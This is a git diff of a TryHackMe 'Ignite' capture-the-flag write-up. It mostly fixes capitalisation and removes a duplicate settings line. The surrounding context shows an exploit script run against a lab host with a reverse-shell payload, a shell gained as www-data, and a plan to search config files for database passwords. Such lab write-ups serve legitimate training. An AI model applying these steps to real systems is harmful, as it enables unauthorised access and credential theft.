@@ -6,7 +6,6 @@ author: "Peter Lymo"
 showToc: true
 description: "Try Hack Me - IGNITE Writeup"
 canonicalURL: "https://canonical.url/to/page"
-disableHLJS: true # to disable highlightjs
 disableHLJS: false
 searchHidden: true
 ShowReadingTime: true
@@ -133,7 +132,7 @@ back to POC terminal and  then run exploit again
 └─$ ruby exploit.rb http://10.10.138.76 'bash+rev.sh'
 ```
 
-i got shell as www-data, 
+I got shell as www-data, 
 
 ```
 ┌──(kali㉿kali)-[~/thm/ignite]
@@ -195,10 +194,10 @@ drwxrwxrwx 9 root     root      4096 Jul 26  2019 fuel
 -rw-r--r-- 1 www-data www-data     3 Sep 16 09:10 test.txt
 root@ubuntu:/var/www/html#
 ```
-there folder fuel, the app folder i will definitely looking for sensitive information like password, a database password
+there folder fuel, the app folder I will definitely looking for sensitive information like password, a database password
 ### vulnerability Details
 
-after looking around i found 
+after looking around I found 
 
 `application/config/database.php`
 checking inside
